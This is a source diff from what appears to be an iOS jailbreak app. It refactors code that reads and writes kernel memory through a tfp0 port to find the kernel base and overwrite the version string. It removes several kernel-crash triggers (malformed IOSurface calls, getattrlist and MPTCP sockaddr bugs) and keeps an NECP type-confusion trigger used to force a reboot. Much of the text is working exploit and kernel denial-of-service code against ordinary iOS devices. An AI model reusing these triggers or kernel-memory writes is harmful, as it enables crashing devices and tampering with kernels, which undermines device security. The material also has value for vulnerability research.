@@ -280,7 +280,6 @@ const char *necp_supported_versions[] = {
 // https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92
 
 #define IMAGE_OFFSET 0x2000
-#define MACHO_HEADER_MAGIC 0xfeedfacf
 #define MAX_KASLR_SLIDE 0x21000000
 #define KERNEL_SEARCH_ADDRESS 0xfffffff007004000
 
@@ -296,7 +295,7 @@ static vm_address_t get_kernel_base(mach_port_t tfp0)
     uint64_t addr = 0;
     addr = KERNEL_SEARCH_ADDRESS+MAX_KASLR_SLIDE;
     
-    while (1) {
+    while (true) {
         char *buf;
         mach_msg_type_number_t sz = 0;
         kern_return_t ret = vm_read(tfp0, addr, 0x200, (vm_offset_t*)&buf, &sz);
@@ -305,7 +304,7 @@ static vm_address_t get_kernel_base(mach_port_t tfp0)
             goto next;
         }
         
-        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
+        if (*((uint32_t *)buf) == MACH_HEADER_MAGIC) {
             int ret = vm_read(tfp0, addr, 0x1000, (vm_offset_t*)&buf, &sz);
             if (ret != KERN_SUCCESS) {
                 LOG("Failed vm_read %i\n", ret);
@@ -318,7 +317,7 @@ static vm_address_t get_kernel_base(mach_port_t tfp0)
                 
                 if (ret != KERN_SUCCESS) {
                     LOG("Failed vm_read %i\n", ret);
-                    exit(-1);
+                    exit(EXIT_FAILURE);
                 }
                 if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                     return addr;
@@ -385,12 +384,12 @@ uint64_t zm_fix_addr(uint64_t addr, uint64_t zone_map_ref) {
         
         if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
             LOG("kread of zone_map failed!\n");
-            exit(1);
+            exit(EXIT_FAILURE);
         }
         
         if (zm_hdr.end - zm_hdr.start > 0x100000000) {
             LOG("zone_map is too big, sorry.\n");
-            exit(1);
+            exit(EXIT_FAILURE);
         }
     }
     
@@ -607,8 +606,6 @@ void unblockDomainWithName(const char *name) {
 
 // https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92
 
-#define DEFAULT_VERSION_STRING "Hacked"
-
 int updateVersionString(const char *newVersionString, mach_port_t tfp0, vm_address_t kernel_base) {
     uintptr_t versionPtr = 0;
     struct utsname u = {0};
@@ -630,7 +627,7 @@ int updateVersionString(const char *newVersionString, mach_port_t tfp0, vm_addre
         int ret = vm_read(tfp0, i, 0x150, (vm_offset_t*)&buf, (mach_msg_type_number_t*)&sz);
         if (ret != KERN_SUCCESS) {
             LOG("Failed vm_read %i\n", ret);
-            exit(-1);
+            exit(EXIT_FAILURE);
         }
         
         if (!strcmp(buf, sectName) && !strcmp(buf+0x10, "__TEXT")) {
@@ -699,7 +696,7 @@ int updateVersionString(const char *newVersionString, mach_port_t tfp0, vm_addre
     ret = vm_write(tfp0, newStringPtr, (vm_offset_t)newVersionString, (mach_msg_type_number_t)strlen(newVersionString));
     if (ret != KERN_SUCCESS) {
         LOG("Failed vm_write %i\n", ret);
-        exit(-1);
+        exit(EXIT_FAILURE);
     }
     
     ret = vm_write(tfp0, versionPtr, (vm_offset_t)&newStringPtr, ptrSize);
@@ -753,165 +750,15 @@ uint64_t getVnodeAtPath(uint64_t vfs_context, const char *path, uint64_t vnode_l
     return vnode;
 }
 
-typedef struct val_attrs {
-    uint32_t          length;
-    attribute_set_t   returned;
-    attrreference_t   name_info;
-} val_attrs_t;
-
-int message_size_for_kalloc_size(int kalloc_size) {
-    return ((3*kalloc_size)/4) - 0x74;
-}
-
-void iosurface_die() {
-    kern_return_t err;
-    
-    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
-    
-    if (service == IO_OBJECT_NULL){
-        LOG("unable to find service\n");
-        return;
-    }
-    
-    LOG("got service port\n");
-    
-    io_connect_t conn = MACH_PORT_NULL;
-    err = IOServiceOpen(service, mach_task_self(), 0, &conn);
-    if (err != KERN_SUCCESS){
-        LOG("unable to get user client connection\n");
-        return;
-    }
-    
-    LOG("got user client: 0x%x\n", conn);
-    
-    uint64_t inputScalar[16];
-    uint64_t inputScalarCnt = 0;
-    
-    char inputStruct[4096];
-    size_t inputStructCnt = 0x18;
-    
-    
-    uint64_t* ivals = (uint64_t*)inputStruct;
-    ivals[0] = 1;
-    ivals[1] = 2;
-    ivals[2] = 3;
-    
-    uint64_t outputScalar[16];
-    uint32_t outputScalarCnt = 0;
-    
-    char outputStruct[4096];
-    size_t outputStructCnt = 0;
-    
-    mach_port_t port = MACH_PORT_NULL;
-    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
-    if (err != KERN_SUCCESS) {
-        LOG("failed to allocate new port\n");
-        return;
-    }
-    LOG("got wake port 0x%x\n", port);
-    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
-    
-    uint64_t reference[8] = {0};
-    uint32_t referenceCnt = 1;
-    
-    for (int i = 0; i < 10; i++) {
-        err = IOConnectCallAsyncMethod(
-                                       conn,
-                                       17,
-                                       port,
-                                       reference,
-                                       referenceCnt,
-                                       inputScalar,
-                                       (uint32_t)inputScalarCnt,
-                                       inputStruct,
-                                       inputStructCnt,
-                                       outputScalar,
-                                       &outputScalarCnt,
-                                       outputStruct,
-                                       &outputStructCnt);
-        
-        LOG("%x\n", err);
-    };
-    
-    return;
-}
-
-int vfs_die() {
-    int fd = open("/", O_RDONLY);
-    if (fd == -1) {
-        perror("unable to open fs root\n");
-        return 0;
-    }
-    
-    struct attrlist al = {0};
-    
-    al.bitmapcount = ATTR_BIT_MAP_COUNT;
-    al.volattr = 0xfff;
-    al.commonattr = ATTR_CMN_RETURNED_ATTRS;
-    
-    size_t attrBufSize = 16;
-    void* attrBuf = malloc(attrBufSize);
-    int options = 0;
-    
-    int err = fgetattrlist(fd, &al, attrBuf, attrBufSize, options);
-    LOG("err: %d\n", err);
-    return 0;
-}
-
-#define AF_MULTIPATH 39
-
-int mptcp_die() {
-    int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
-    if (sock < 0) {
-        LOG("socket failed\n");
-        perror("");
-        return 0;
-    }
-    LOG("got socket: %d\n", sock);
-    
-    struct sockaddr* sockaddr_src = malloc(256);
-    memset(sockaddr_src, 'A', 256);
-    sockaddr_src->sa_len = 220;
-    sockaddr_src->sa_family = 'B';
-    
-    struct sockaddr* sockaddr_dst = malloc(256);
-    memset(sockaddr_dst, 'A', 256);
-    sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
-    sockaddr_dst->sa_family = AF_INET6;
-    
-    sa_endpoints_t eps = {0};
-    eps.sae_srcif = 0;
-    eps.sae_srcaddr = sockaddr_src;
-    eps.sae_srcaddrlen = 220;
-    eps.sae_dstaddr = sockaddr_dst;
-    eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);
-    
-    int err = connectx(
-                       sock,
-                       &eps,
-                       SAE_ASSOCID_ANY,
-                       0,
-                       NULL,
-                       0,
-                       NULL,
-                       NULL);
-    
-    LOG("err: %d\n", err);
-    
-    close(sock);
-    
-    return 0;
-}
-
 // https://blogs.projectmoon.pw/2018/11/30/A-Late-Kernel-Bug-Type-Confusion-in-NECP/NECPTypeConfusion.c
 
 int necp_die() {
     int necp_fd = syscall(SYS_necp_open, 0);
     if (necp_fd < 0) {
-        LOG("[-] Create NECP client failed!\n");
+        LOG("Create NECP client failed!\n");
         return 0;
     }
-    LOG("[*] NECP client = %d\n", necp_fd);
+    LOG("NECP client = %d\n", necp_fd);
     syscall(SYS_necp_session_action, necp_fd, 1, 0x1234, 0x5678);
     return 0;
 }
@@ -961,146 +808,6 @@ double uptime() {
     return difftime(csec, bsec);
 }
 
-int isJailbroken() {
-    struct utsname u = { 0 };
-    uname(&u);
-    return (strstr(u.version, DEFAULT_VERSION_STRING) != NULL);
-}
-
-int isSupportedByExploit(int exploit) {
-    struct utsname u = { 0 };
-    const char **versions = NULL;
-    switch (exploit) {
-        case EMPTY_LIST: {
-            versions = empty_list_supported_versions;
-            break;
-        }
-        case MULTI_PATH: {
-            versions = multi_path_supported_versions;
-            break;
-        }
-        case ASYNC_WAKE: {
-            versions = async_wake_supported_versions;
-            break;
-        }
-        case DEJA_XNU: {
-            versions = deja_xnu_supported_versions;
-            break;
-        }
-        case NECP: {
-            versions = necp_supported_versions;
-            break;
-        }
-        default:
-            break;
-    }
-    if (versions != NULL) {
-        uname(&u);
-        while (*versions) {
-            if (strstr(u.version, *versions) != NULL) {
-                return true;
-            }
-            versions++;
-        }
-    }
-    return false;
-}
-
-int hasMPTCP() {
-    int rv = 0;
-    
-    int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
-    if (sock < 0) {
-        LOG("socket failed\n");
-        perror("");
-        return rv;
-    }
-    LOG("got socket: %d\n", sock);
-    
-    struct sockaddr* sockaddr_src = malloc(sizeof(struct sockaddr));
-    memset(sockaddr_src, 'A', sizeof(struct sockaddr));
-    sockaddr_src->sa_len = sizeof(struct sockaddr);
-    sockaddr_src->sa_family = AF_INET6;
-    
-    struct sockaddr* sockaddr_dst = malloc(sizeof(struct sockaddr));
-    memset(sockaddr_dst, 'A', sizeof(struct sockaddr));
-    sockaddr_dst->sa_len = sizeof(struct sockaddr);
-    sockaddr_dst->sa_family = AF_INET;
-    
-    sa_endpoints_t eps = {0};
-    eps.sae_srcif = 0;
-    eps.sae_srcaddr = sockaddr_src;
-    eps.sae_srcaddrlen = sizeof(struct sockaddr);
-    eps.sae_dstaddr = sockaddr_dst;
-    eps.sae_dstaddrlen = sizeof(struct sockaddr);
-    
-    int err = connectx(
-                       sock,
-                       &eps,
-                       SAE_ASSOCID_ANY,
-                       0,
-                       NULL,
-                       0,
-                       NULL,
-                       NULL);
-    
-    rv = (errno != 1);
-    
-    LOG("err: %d\n", err);
-    
-    free(sockaddr_src);
-    free(sockaddr_dst);
-    close(sock);
-    
-    return rv;
-}
-
-int selectJailbreakExploit() {;
-    if (isSupportedByExploit(ASYNC_WAKE)) {
-        return ASYNC_WAKE;
-    } else if (isSupportedByExploit(MULTI_PATH) && hasMPTCP()) {
-        return MULTI_PATH;
-    } else if (isSupportedByExploit(EMPTY_LIST)) {
-        return EMPTY_LIST;
-    } else {
-        return -1;
-    }
-}
-
-int isSupportedByJailbreak() {
-    return (selectJailbreakExploit() != -1);
-}
-
-int selectRestartExploit() {;
-    if (isSupportedByExploit(NECP)) {
-        return NECP;
-    } else if (isSupportedByExploit(ASYNC_WAKE)) {
-        return ASYNC_WAKE;
-    } else if (isSupportedByExploit(MULTI_PATH) && hasMPTCP()) {
-        return MULTI_PATH;
-    } else if (isSupportedByExploit(EMPTY_LIST)) {
-        return EMPTY_LIST;
-    } else {
-        return -1;
-    }
-}
-
-int isSupportedByRestart() {
-    return (selectRestartExploit() != -1);
-}
-
-int selectRespringExploit() {;
-    if (isSupportedByExploit(DEJA_XNU) && !isJailbroken()) {
-        return DEJA_XNU;
-    } else {
-        return -1;
-    }
-}
-
-int isSupportedByRespring() {
-    return (selectRespringExploit() != -1);
-}
-
 int waitForFile(const char *filename) {
     int rv = 0;
     rv = access(filename, F_OK);
@@ -1123,29 +830,6 @@ void extractResources() {
         _assert(installDeb("injector.deb", false), message, true);
     }
     _assert(installDeb("resources.deb", false), message, true);
-}
-
-void crashKernel() {
-    switch (selectRestartExploit()) {
-        case EMPTY_LIST: {
-            vfs_die();
-            break;
-        }
-        case ASYNC_WAKE: {
-            iosurface_die();
-            break;
-        }
-        case MULTI_PATH: {
-            mptcp_die();
-            break;
-        }
-        case NECP: {
-            necp_die();
-            break;
-        }
-        default:
-            break;
-    }
 }
 
 bool load_prefs(prefs_t *prefs, NSDictionary *defaults) {
@@ -1872,7 +1556,7 @@ void exploit(mach_port_t tfp0,
     {
         // Update version string.
         
-        if (!isJailbroken()) {
+        if (!jailbreakEnabled()) {
             LOG("Updating version string...");
             SETMESSAGE(NSLocalizedString(@"Failed to update version string.", nil));
             struct utsname u;
@@ -2333,7 +2017,7 @@ void exploit(mach_port_t tfp0,
 {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
         _assert(BUNDLEDRESOURCES != nil, NSLocalizedString(@"Bundled Resources version missing.", nil), true);
-        if (!isSupportedByJailbreak()) {
+        if (!jailbreakSupported()) {
             PROGRESS(NSLocalizedString(@"Unsupported", nil), false, true);
             return;
         }
@@ -2346,16 +2030,16 @@ void exploit(mach_port_t tfp0,
             prepare_for_rw_with_fake_tfp0(persisted_port);
         } else {
             switch ([[NSUserDefaults standardUserDefaults] integerForKey:@K_EXPLOIT]) {
-                case EMPTY_LIST: {
+                case empty_list: {
                     vfs_sploit();
                     break;
                 }
                     
-                case MULTI_PATH: {
+                case multi_path: {
                     mptcp_go();
                     break;
                 }
-                case ASYNC_WAKE: {
+                case async_wake: {
                     async_wake_go();
                     break;
                 }
@@ -2369,12 +2053,31 @@ void exploit(mach_port_t tfp0,
         LOG("Validating TFP0...");
         if (MACH_PORT_VALID(tfp0)) {
             LOG("Successfully validated TFP0.");
-        } else {
+        } else if (restartSupported()) {
             NOTICE(NSLocalizedString(@"Kernel exploit failed. This is not an error. Tap OK to reboot and try again.", nil), true, false);
-            crashKernel();
+            NSInteger support = recommendedRestartSupport();
+            _assert(support != -1, message, true);
+            switch (support) {
+                case necp: {
+                    necp_die();
+                    break;
+                }
+                default:
+                    break;
+            }
+            exit(EXIT_FAILURE);
+        } else {
+            NOTICE(NSLocalizedString(@"Kernel exploit failed. This is not an error. Reboot and try again.", nil), true, false);
+            exit(EXIT_FAILURE);
         }
-        // NOTICE(@"Jailbreak succeeded, but still needs a few minutes to respring.", 0, 0);
-        exploit(tfp0, (uint64_t)get_kernel_base(tfp0), [[NSUserDefaults standardUserDefaults] dictionaryRepresentation]);
+        uint64_t kernel_base = (uint64_t)get_kernel_base(tfp0);
+        LOG("kernel_base: " ADDR "\n", kernel_base);
+        _assert(ISADDR(kernel_base), message, true);
+        uint32_t kernel_magic = ReadKernel32(kernel_base);
+        LOG("kernel_magic: " "0x%x" "\n", kernel_magic);
+        _assert(kernel_magic == MACH_HEADER_MAGIC, message, true);
+        // NOTICE(@"Jailbreak succeeded, but still needs a few minutes to respring.", false, false);
+        exploit(tfp0, kernel_base, [[NSUserDefaults standardUserDefaults] dictionaryRepresentation]);
         PROGRESS(NSLocalizedString(@"Jailbroken", nil), false, false);
     });
 }
@@ -2397,9 +2100,9 @@ void exploit(mach_port_t tfp0,
     [super viewDidLoad];
     // Do any additional setup after loading the view, typically from a nib.
     sharedController = self;
-    if (isJailbroken()) {
+    if (jailbreakEnabled()) {
         PROGRESS(NSLocalizedString(@"Re-Jailbreak", nil), true, true);
-    } else if (!isSupportedByJailbreak()) {
+    } else if (!jailbreakSupported()) {
         PROGRESS(NSLocalizedString(@"Unsupported", nil), false, true);
     }
     LOG("Bundled Resources Version: %@", BUNDLEDRESOURCES);
